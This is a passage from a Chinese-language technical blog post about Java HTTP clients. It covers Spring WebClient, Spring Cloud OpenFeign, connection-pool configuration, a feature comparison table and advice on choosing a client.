<li><strong>维护状态</strong>: 从Spring 5.0开始，官方明确表示<code>RestTemplate</code>进入<strong>维护模式（Maintenance Mode）</strong>。这意味着它不会再添加任何新功能，只会修复严重的Bug和安全漏洞。</li>
<li><strong>官方推荐</strong>: Spring官方强烈推荐在新项目中使用<code>WebClient</code>作为HTTP客户端的首选。</li>
</ul>
<hr>
<h2 id="2-WebClient-官方推荐"><a href="#2-WebClient-官方推荐" class="headerlink" title="2. WebClient (官方推荐)"></a>2. <code>WebClient</code> (官方推荐)</h2><p>随着Spring 5和Spring WebFlux框架的发布，Spring引入了<code>WebClient</code>，一个全新的、旨在取代<code>RestTemplate</code>的现代化HTTP客户端。</p>
<h3 id="2-1-定位"><a href="#2-1-定位" class="headerlink" title="2.1 定位"></a>2.1 定位</h3><p><code>WebClient</code>的设计哲学与<code>RestTemplate</code>截然相反，它完全拥抱了现代应用开发的核心理念。</p>
<ul>
<li><strong>响应式核心 (Reactive Core)</strong>: <code>WebClient</code>是<strong>Spring WebFlux</strong>模块的一部分，其底层基于<strong>Project Reactor</strong>响应式库。这意味着它的所有操作本质上都是非阻塞的，并且返回的是响应式类型——<code>Mono&lt;T&gt;</code>（代表0或1个元素）和<code>Flux&lt;T&gt;</code>（代表0到N个元素）。</li>
<li><strong>非阻塞I&#x2F;O (Non-Blocking I&#x2F;O)</strong>: <code>WebClient</code>默认使用Netty作为其底层HTTP引擎，Netty是一个基于事件驱动的高性能NIO（非阻塞I&#x2F;O）框架。当一个<code>WebClient</code>请求发出后，它不会阻塞当前线程，而是注册一个回调。当I&#x2F;O事件（如响应到达）发生时，Netty的事件循环线程会触发这个回调。这使得系统可以用极少数的线程来处理海量的并发HTTP请求，极大地提升了应用的伸缩性和资源利用率。</li>
<li><strong>函数式与流式API (Functional &amp; Fluent API)</strong>: 它提供了非常优雅的、链式调用的函数式API，使得构建和执行HTTP请求的过程如丝般顺滑，代码可读性极高。</li>
</ul>
<hr>
<h3 id="2-2-核心用法"><a href="#2-2-核心用法" class="headerlink" title="2.2 核心用法"></a>2.2 核心用法</h3><p>使用<code>WebClient</code>的过程是一个声明式的、链式的“配方”构建过程。</p>
<p><strong>构建流程（The “WebClient Recipe”）：</strong></p>
<ol>
<li><strong>创建 <code>WebClient</code> 实例</strong>: 通常通过<code>WebClient.create(baseUrl)</code>或<code>WebClient.builder()</code>创建，并配置为Spring Bean。</li>
<li><strong>指定HTTP方法</strong>: <code>.get()</code>, <code>.post()</code>, <code>.put()</code>, etc.</li>
<li><strong>设置URI</strong>: <code>.uri(&quot;/path/{id}&quot;, idValue)</code></li>
<li><strong>设置Header&#x2F;Cookie</strong>: <code>.header(...)</code>, <code>.cookie(...)</code></li>
<li><strong>设置请求体 (if any)</strong>: <code>.bodyValue(object)</code> or <code>.body(publisher, ...)</code></li>
<li><strong>发起请求并获取响应</strong>: <code>.retrieve()</code> 或 <code>.exchangeToMono()</code> &#x2F; <code>.exchangeToFlux()</code></li>
<li><strong>处理响应</strong>: 对返回的<code>Mono</code>或<code>Flux</code>进行操作，例如<code>.bodyToMono(User.class)</code>。</li>
<li><strong>订阅 (Subscribe)</strong>: 响应式流在被“订阅”之前，什么都不会发生。这是惰性求值的核心。</li>
</ol>
<p><strong>示例：发送GET和POST请求</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 webClient 是一个已注入的Bean</span></span><br><span class="line"><span class="type">WebClient</span> <span class="variable">webClient</span> <span class="operator">=</span> WebClient.create(<span class="string">&quot;https://api.example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例1：GET请求，并将响应体转换为User对象</span></span><br><span class="line">Mono&lt;User&gt; userMono = webClient.get()</span><br><span class="line">    .uri(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, <span class="number">101</span>)</span><br><span class="line">    .retrieve() <span class="comment">// 获取响应体</span></span><br><span class="line">    .bodyToMono(User.class); <span class="comment">// 将响应体转换为Mono&lt;User&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 订阅Mono以触发请求</span></span><br><span class="line">userMono.subscribe(</span><br><span class="line">    user -&gt; System.out.println(<span class="string">&quot;User received: &quot;</span> + user),</span><br><span class="line">    error -&gt; System.err.println(<span class="string">&quot;Error fetching user: &quot;</span> + error)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2：POST请求，并获取响应状态码</span></span><br><span class="line">Mono&lt;String&gt; postResultMono = webClient.post()</span><br><span class="line">    .uri(<span class="string">&quot;/data&quot;</span>)</span><br><span class="line">    .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">    .bodyValue(<span class="keyword">new</span> <span class="title class_">DataObject</span>(<span class="string">&quot;test&quot;</span>)) <span class="comment">// 最简单的设置body的方式</span></span><br><span class="line">    .retrieve()</span><br><span class="line">    .bodyToMono(String.class); <span class="comment">// 假设返回的是一个确认字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>.retrieve()</code></strong>: 这是最常用的方式，它提供了一个简化的API来处理响应体。如果HTTP状态码是4xx或5xx，它会自动抛出一个<code>WebClientResponseException</code>，这与<code>RestTemplate</code>的行为类似。</li>
<li><strong><code>.exchangeToMono()</code> &#x2F; <code>.exchangeToFlux()</code></strong>: 提供更完整的响应控制，返回一个<code>ClientResponse</code>对象，你可以从中访问状态码、头信息和响应体。这允许你自定义错误处理逻辑，而不是直接抛出异常。</li>
</ul>
<hr>
<h3 id="2-3-同步调用"><a href="#2-3-同步调用" class="headerlink" title="2.3 同步调用"></a>2.3 同步调用</h3><p>虽然<code>WebClient</code>是为异步而生，但它也提供了<code>.block()</code>方法，允许你在一个非响应式的上下文中（例如，传统的Spring MVC Controller或一个简单的main方法）获取结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 警告：这会阻塞当前线程！</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> webClient.get()</span><br><span class="line">        .uri(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, <span class="number">101</span>)</span><br><span class="line">        .retrieve()</span><br><span class="line">        .bodyToMono(User.class)</span><br><span class="line">        .block(); <span class="comment">// 阻塞线程，直到Mono发出元素</span></span><br><span class="line">    System.out.println(<span class="string">&quot;User (blocked): &quot;</span> + user);</span><br><span class="line">&#125; <span class="keyword">catch</span> (WebClientResponseException e) &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;Error: &quot;</span> + e.getRawStatusCode() + <span class="string">&quot; -&gt; &quot;</span> + e.getResponseBodyAsString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用场景与风险</strong>:</p>
<ul>
<li><strong>适用场景</strong>:<ul>
<li><strong>迁移过程</strong>: 在将一个基于<code>RestTemplate</code>的旧应用逐步迁移到响应式栈时，可以在部分代码中临时使用<code>.block()</code>来保持同步行为。</li>
<li><strong>单元测试</strong>: 在测试代码中，使用<code>.block()</code>可以方便地验证异步调用的结果。</li>
<li><strong>应用启动阶段</strong>: 在应用启动时，需要同步获取一些配置信息。</li>
</ul>
</li>
<li><strong>巨大风险</strong>:<ul>
<li><strong>严禁在响应式上下文中使用</strong>: <strong>绝对不能在一个响应式管道中（例如，在一个WebFlux的Controller方法里）调用<code>.block()</code></strong>。响应式框架通常运行在少数几个固定的事件循环线程上。如果在这些线程上调用<code>.block()</code>，会耗尽整个线程池，导致应用完全失去响应，造成灾难性的后果。</li>
<li><strong>性能瓶颈</strong>: 即使在非响应式上下文中，过度使用<code>.block()</code>也违背了使用<code>WebClient</code>的初衷，会使你的应用退化回同步阻塞模型，无法享受非阻塞I&#x2F;O带来的性能优势。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-4-过滤器"><a href="#2-4-过滤器" class="headerlink" title="2.4 过滤器"></a>2.4 过滤器</h3><p><code>WebClient</code>通过<code>ExchangeFilterFunction</code>提供了与OkHttp拦截器或Servlet过滤器非常相似的AOP能力。它允许你在请求发送前或响应返回后执行通用逻辑。</p>
<p><code>ExchangeFilterFunction</code>是一个函数式接口，它接收一个<code>ClientRequest</code>和下一个过滤器<code>ExchangeFunction</code>，并返回一个<code>Mono&lt;ClientResponse&gt;</code>。</p>
<p><strong>示例：添加日志和认证头的过滤器</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.client.ExchangeFilterFunction;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志过滤器</span></span><br><span class="line">ExchangeFilterFunction <span class="title function_">logRequestFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ExchangeFilterFunction.ofRequestProcessor(clientRequest -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Request: &quot;</span> + clientRequest.method() + <span class="string">&quot; &quot;</span> + clientRequest.url());</span><br><span class="line">        clientRequest.headers().forEach((name, values) -&gt; </span><br><span class="line">            values.forEach(value -&gt; System.out.println(name + <span class="string">&quot;: &quot;</span> + value))</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> Mono.just(clientRequest);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认证过滤器</span></span><br><span class="line">ExchangeFilterFunction <span class="title function_">addAuthHeaderFilter</span><span class="params">(String token)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (clientRequest, next) -&gt; &#123;</span><br><span class="line">        <span class="type">ClientRequest</span> <span class="variable">newRequest</span> <span class="operator">=</span> ClientRequest.from(clientRequest)</span><br><span class="line">            .header(<span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Bearer &quot;</span> + token)</span><br><span class="line">            .build();</span><br><span class="line">        <span class="keyword">return</span> next.exchange(newRequest);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在构建WebClient时应用过滤器</span></span><br><span class="line"><span class="type">WebClient</span> <span class="variable">filteredClient</span> <span class="operator">=</span> WebClient.builder()</span><br><span class="line">    .filter(logRequestFilter())</span><br><span class="line">    .filter(addAuthHeaderFilter(<span class="string">&quot;my-secret-token&quot;</span>))</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<p>通过<code>.filter()</code>方法，可以构建一个过滤器链，实现日志、监控、认证、重试等各种横切关注点，代码清晰且易于组合。</p>
<hr>
<h3 id="2-5-底层集成"><a href="#2-5-底层集成" class="headerlink" title="2.5 底层集成"></a>2.5 底层集成</h3><p>与<code>RestTemplate</code>一样，<code>WebClient</code>也只是一个上层抽象。它通过<code>ClientHttpConnector</code>接口来与底层的HTTP客户端引擎交互。</p>
<ul>
<li><strong>默认引擎</strong>: 如果类路径下有<code>reactor-netty</code>，Spring Boot会自动配置<code>WebClient</code>使用<strong>Netty</strong>作为底层引擎。这是最常见也是性能最高的组合。</li>
<li><strong>切换引擎</strong>: 你可以轻松地切换到底层实现，以利用特定库的功能或满足项目需求。<ul>
<li><strong>Jetty</strong>: 引入<code>spring-boot-starter-webflux</code>和<code>reactor-jetty</code>。</li>
<li><strong>Apache HttpClient</strong>: 创建一个<code>HttpComponentsClientHttpConnector</code>。</li>
<li><strong>OkHttp</strong>: 创建一个<code>OkHttp3ClientHttpConnector</code>。</li>
</ul>
</li>
</ul>
<p><strong>示例：配置WebClient使用OkHttp作为底层</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebClientConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebClient <span class="title function_">webClient</span><span class="params">(OkHttpClient okHttpClient)</span> &#123; <span class="comment">// 注入一个配置好的OkHttpClient单例</span></span><br><span class="line">        <span class="keyword">return</span> WebClient.builder()</span><br><span class="line">                .clientConnector(<span class="keyword">new</span> <span class="title class_">OkHttp3ClientHttpConnector</span>(okHttpClient))</span><br><span class="line">                .baseUrl(<span class="string">&quot;https://api.example.com&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种灵活性使得<code>WebClient</code>不仅是一个优秀的响应式客户端，还是一个统一的、可插拔的HTTP客户端门面（Facade），能够整合和利用现有各种优秀客户端的能力。</p>
<hr>
<h2 id="3-Spring-Cloud-OpenFeign-声明式客户端"><a href="#3-Spring-Cloud-OpenFeign-声明式客户端" class="headerlink" title="3. Spring Cloud OpenFeign (声明式客户端)"></a>3. <code>Spring Cloud OpenFeign</code> (声明式客户端)</h2><p>OpenFeign是Spring Cloud全家桶中的一个核心组件，它在Netflix Feign的基础上进行了增强，使其能与Spring Boot和Spring Cloud生态无缝集成。它提供了一种全新的、声明式的方式来编写HTTP客户端。</p>
<hr>
<h3 id="3-1-定位"><a href="#3-1-定位" class="headerlink" title="3.1 定位"></a>3.1 定位</h3><p>在微服务架构中，一个服务经常需要调用另一个服务提供的HTTP API。传统的做法是使用<code>RestTemplate</code>或<code>WebClient</code>来手动构建HTTP请求，这会导致大量的样板代码，并且当API变更时，维护成本很高。</p>
<p>OpenFeign的定位就是为了解决这个问题。它的核心思想是：<strong>像调用本地方法一样调用远程HTTP API</strong>。</p>
<ul>
<li><strong>声明式 (Declarative)</strong>: 开发者只需定义一个Java接口，并使用注解来描述HTTP请求的细节（如URL、请求方法、请求头、参数等）。</li>
<li><strong>动态代理 (Dynamic Proxy)</strong>: 在应用启动时，Spring Cloud会为这个接口创建一个动态代理实现。当你调用接口中的方法时，这个代理类会“拦截”你的调用，根据注解信息自动组装成一个HTTP请求，然后使用底层的HTTP客户端发送出去，并处理响应。</li>
<li><strong>简化与解耦</strong>: 这种方式将网络通信的复杂性完全隐藏起来，让开发者可以专注于业务逻辑，而无需关心HTTP请求的构建、发送和解析。它使得服务间的调用代码变得极其简洁、优雅且易于测试。</li>
</ul>
<hr>
<h3 id="3-2-核心用法"><a href="#3-2-核心用法" class="headerlink" title="3.2 核心用法"></a>3.2 核心用法</h3><p>使用OpenFeign的核心就是编写一个带有注解的接口。</p>
<p><strong>步骤：</strong></p>
<ol>
<li><strong>引入依赖</strong>: 在<code>pom.xml</code>中添加<code>spring-cloud-starter-openfeign</code>。</li>
<li><strong>启用Feign</strong>: 在主启动类上添加<code>@EnableFeignClients</code>注解。</li>
<li><strong>定义Feign客户端接口</strong>:</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @FeignClient注解是核心</span></span><br><span class="line"><span class="comment">// &quot;user-service&quot; 是要调用的目标服务的服务名（在Nacos/Eureka等注册中心中注册的名字）</span></span><br><span class="line"><span class="comment">// url 属性用于直接指定URL，通常在调试或不使用服务发现时使用。name和url通常只用一个。</span></span><br><span class="line"><span class="meta">@FeignClient(name = &quot;user-service&quot;, url = &quot;$&#123;feign.client.user-service.url:&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserServiceClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注解与Spring MVC的Controller注解几乎完全一样，学习成本极低</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users/&#123;id&#125;&quot;)</span></span><br><span class="line">    User <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/users&quot;)</span></span><br><span class="line">    ResponseEntity&lt;Void&gt; <span class="title function_">createUser</span><span class="params">(<span class="meta">@RequestBody</span> User newUser)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以传递复杂的Header</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users/search&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">searchUsers</span><span class="params">(<span class="meta">@RequestParam(&quot;query&quot;)</span> String query, <span class="meta">@RequestHeader(&quot;X-Request-ID&quot;)</span> String requestId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>注入并使用</strong>: 像注入任何其他Spring Bean一样，直接注入并调用接口方法。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserServiceClient userServiceClient;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderService</span><span class="params">(UserServiceClient userServiceClient)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userServiceClient = userServiceClient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Order <span class="title function_">createOrder</span><span class="params">(Long userId, ...)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用远程服务，就像调用一个本地方法一样简单</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userServiceClient.getUserById(userId);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UserNotFoundException</span>(<span class="string">&quot;User not found with id: &quot;</span> + userId);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ... 创建订单的业务逻辑</span></span><br><span class="line">        <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>(...);</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-3-负载均衡"><a href="#3-3-负载均衡" class="headerlink" title="3.3 负载均衡"></a>3.3 负载均衡</h3><p>这是OpenFeign在微服务生态中最强大的能力之一。</p>
<ul>
<li><strong>服务发现与负载均衡</strong>: 当你在<code>@FeignClient</code>注解中使用<code>name</code>属性指定一个服务名（如<code>user-service</code>）时，OpenFeign会自动与<strong>Spring Cloud LoadBalancer</strong>（取代了旧的Ribbon）集成。</li>
<li><strong>工作流程</strong>:<ol>
<li>当你调用<code>userServiceClient.getUserById(1L)</code>时，Feign代理不会直接请求一个固定的IP地址。</li>
<li>它会向服务发现组件（如Nacos, Eureka）查询名为<code>user-service</code>的服务当前有哪些可用的实例（例如 <code>192.168.1.10:8080</code>, <code>192.168.1.11:8080</code>）。</li>
<li>Spring Cloud LoadBalancer会根据其负载均衡策略（默认为轮询 Round-Robin）从实例列表中选择一个健康的实例。</li>
<li>最后，Feign将HTTP请求发送到选定的实例上。</li>
</ol>
</li>
</ul>
<p>这种集成是<strong>完全自动</strong>的，开发者无需编写任何负载均衡相关的代码，就能轻松实现服务调用的高可用和负载分摊。</p>
<hr>
<h3 id="3-4-底层切换"><a href="#3-4-底层切换" class="headerlink" title="3.4 底层切换"></a>3.4 底层切换</h3><p>默认情况下，Spring Cloud OpenFeign使用JDK的<code>HttpURLConnection</code>作为其底层HTTP客户端（通过一个简单的<code>Feign.Client.Default</code>实现）。这意味着，未经配置的OpenFeign<strong>没有连接池</strong>，性能不佳，不适合生产环境。</p>
<p>为了获得高性能，<strong>强烈建议</strong>为OpenFeign配置一个支持连接池的HTTP客户端。</p>
<p><strong>如何切换：</strong></p>
<ol>
<li><strong>引入依赖</strong>: 在<code>pom.xml</code>中加入对应的客户端依赖：<ul>
<li><strong>Apache HttpClient</strong>: <code>io.github.openfeign:feign-httpclient</code></li>
<li><strong>OkHttp</strong>: <code>io.github.openfeign:feign-okhttp</code></li>
</ul>
</li>
<li><strong>开启配置</strong>: 在<code>application.yml</code>（或<code>.properties</code>）中开启相应的支持。Spring Boot会自动检测到依赖并创建对应的<code>Feign.Client</code> Bean。</li>
</ol>
<p><strong>application.yml配置示例：</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="comment"># 开启对Apache HttpClient的支持</span></span><br><span class="line">  <span class="comment"># 引入feign-httpclient依赖后，将此项设为true即可</span></span><br><span class="line">  <span class="attr">httpclient:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 可以进一步配置连接池参数</span></span><br><span class="line">    <span class="attr">max-connections:</span> <span class="number">200</span></span><br><span class="line">    <span class="attr">max-connections-per-route:</span> <span class="number">50</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment"># 或者，开启对OkHttp的支持</span></span><br><span class="line">  <span class="comment"># 引入feign-okhttp依赖后，将此项设为true即可</span></span><br><span class="line">  <span class="comment"># 注意：httpclient和okhttp通常只开启一个</span></span><br><span class="line">  <span class="comment"># okhttp:</span></span><br><span class="line">  <span class="comment">#  enabled: true</span></span><br></pre></td></tr></table></figure>

<p>一旦开启，Spring Cloud OpenFeign将自动使用配置好连接池的HttpClient或OkHttp来发送所有请求，从而极大地提升性能和稳定性。开发者无需修改任何Java代码，只需更改依赖和配置即可完成底层的“引擎”切换，这体现了Spring Boot自动配置的强大威力。</p>
<hr>
<h1 id="六、核心功能横向对比与选型指南"><a href="#六、核心功能横向对比与选型指南" class="headerlink" title="六、核心功能横向对比与选型指南"></a>六、核心功能横向对比与选型指南</h1><h2 id="1-功能特性对比表"><a href="#1-功能特性对比表" class="headerlink" title="1. 功能特性对比表"></a>1. 功能特性对比表</h2><table>
<thead>
<tr>
<th align="left">特性维度</th>
<th align="left"><strong>Apache HttpClient</strong></th>
<th align="left"><strong>OkHttp</strong></th>
<th align="left"><strong>JDK 11+ HttpClient</strong></th>
<th align="left"><strong>Spring WebClient</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>API风格</strong></td>
<td align="left"><strong>面向对象，繁琐</strong> (Verbose, Object-Oriented)</td>
<td align="left"><strong>流式，简洁</strong> (Fluent, Concise)</td>
<td align="left"><strong>流式，现代</strong> (Fluent, Modern)</td>
<td align="left"><strong>响应式，流式</strong> (Reactive, Fluent)</td>
</tr>
<tr>
<td align="left"><strong>编程模型</strong></td>
<td align="left"><strong>同步为主</strong> (Sync-first), 异步支持较弱 (Callback-based async)</td>
<td align="left"><strong>同步&#x2F;异步均衡</strong> (Balanced Sync&#x2F;Async via <code>execute</code>&#x2F;<code>enqueue</code>)</td>
<td align="left"><strong>异步优先</strong> (Async-first via <code>CompletableFuture</code>)</td>
<td align="left"><strong>响应式</strong> (Reactive-first via <code>Mono</code>&#x2F;<code>Flux</code>)</td>
</tr>
<tr>
<td align="left"><strong>HTTP&#x2F;2支持</strong></td>
<td align="left"><strong>支持</strong> (需5.x+版本或特殊配置)</td>
<td align="left"><strong>默认支持，透明</strong> (Transparently enabled by default)</td>
<td align="left"><strong>默认支持，透明</strong> (Transparently enabled by default)</td>
<td align="left"><strong>依赖底层</strong> (Depends on Netty, OkHttp, etc.)</td>
</tr>
<tr>
<td align="left"><strong>连接池管理</strong></td>
<td align="left"><strong>手动精细配置</strong> (Powerful, manual configuration)</td>
<td align="left"><strong>自动管理，高效</strong> (Auto-managed, efficient defaults)</td>
<td align="left"><strong>自动管理，黑盒</strong> (Auto-managed, limited configuration)</td>
<td align="left"><strong>依赖底层</strong> (Inherits from the underlying client)</td>
</tr>
<tr>
<td align="left"><strong>拦截&#x2F;扩展机制</strong></td>
<td align="left"><strong><code>HttpRequest/ResponseInterceptor</code></strong></td>
<td align="left"><strong>强大的拦截器链</strong> (Powerful Interceptor Chain)</td>
<td align="left"><strong>无原生机制</strong> (No native mechanism)</td>
<td align="left"><strong><code>ExchangeFilterFunction</code></strong></td>
</tr>
<tr>
<td align="left"><strong>核心依赖</strong></td>
<td align="left"><strong>第三方库</strong> (<code>org.apache.httpcomponents</code>)</td>
<td align="left"><strong>第三方库</strong> (<code>com.squareup.okhttp3</code>)</td>
<td align="left"><strong>JDK内置</strong> (Java 11+)</td>
<td align="left"><strong>Spring框架</strong> (<code>spring-webflux</code>)</td>
</tr>
<tr>
<td align="left"><strong>主要优点</strong></td>
<td align="left">功能最全, 稳定, 高度可配, 复杂认证支持好</td>
<td align="left">高性能, API优雅, 拦截器强大, 安卓标准</td>
<td align="left">无依赖, 原生标准, <code>CompletableFuture</code>异步模型</td>
<td align="left">与Spring生态无缝集成, 端到端响应式</td>
</tr>
<tr>
<td align="left"><strong>主要缺点</strong></td>
<td align="left">API笨重, 设计陈旧, 心智负担重</td>
<td align="left">内置复杂认证支持少</td>
<td align="left">功能和生态单薄, 连接池配置弱, 无拦截器</td>
<td align="left">有响应式学习曲线, 强依赖Spring</td>
</tr>
</tbody></table>
<hr>
<h2 id="2-场景化选型建议"><a href="#2-场景化选型建议" class="headerlink" title="2. 场景化选型建议"></a>2. 场景化选型建议</h2><h3 id="2-1-新建Spring-Boot项目：首选-WebClient"><a href="#2-1-新建Spring-Boot项目：首选-WebClient" class="headerlink" title="2.1. 新建Spring Boot项目：首选 WebClient"></a>2.1. 新建Spring Boot项目：首选 <code>WebClient</code></h3><ul>
<li><strong>理由</strong>: <code>WebClient</code>是Spring官方钦定的下一代客户端，代表了未来的方向。它基于非阻塞I&#x2F;O，能够构建高性能、高伸缩性的应用，完美契合现代微服务对资源效率的要求。与Spring生态（如Project Reactor, Spring Cloud Gateway, R2DBC）的无缝集成，能让你构建端到端的响应式系统。</li>
<li><strong>实践</strong>: 即使你的应用不是完全响应式的，<code>WebClient</code>依然是最佳选择。你可以通过<code>.block()</code>方法在传统Spring MVC控制器或服务中进行同步调用，为未来向响应式迁移做好准备。同时，它的链式API和<code>ExchangeFilterFunction</code>也比<code>RestTemplate</code>提供了更现代、更强大的开发体验。</li>
</ul>
<hr>
<h3 id="2-2-微服务内部调用：首选-Spring-Cloud-OpenFeign"><a href="#2-2-微服务内部调用：首选-Spring-Cloud-OpenFeign" class="headerlink" title="2.2. 微服务内部调用：首选 Spring Cloud OpenFeign"></a>2.2. 微服务内部调用：首选 <code>Spring Cloud OpenFeign</code></h3><ul>
<li><strong>理由</strong>: 在Spring Cloud环境中，服务间的调用是高频操作。OpenFeign通过声明式接口的方式，将HTTP调用的复杂性完全屏蔽，让调用远程服务如同调用本地方法一样简单、直观。这极大地提升了开发效率，降低了代码的维护成本。</li>
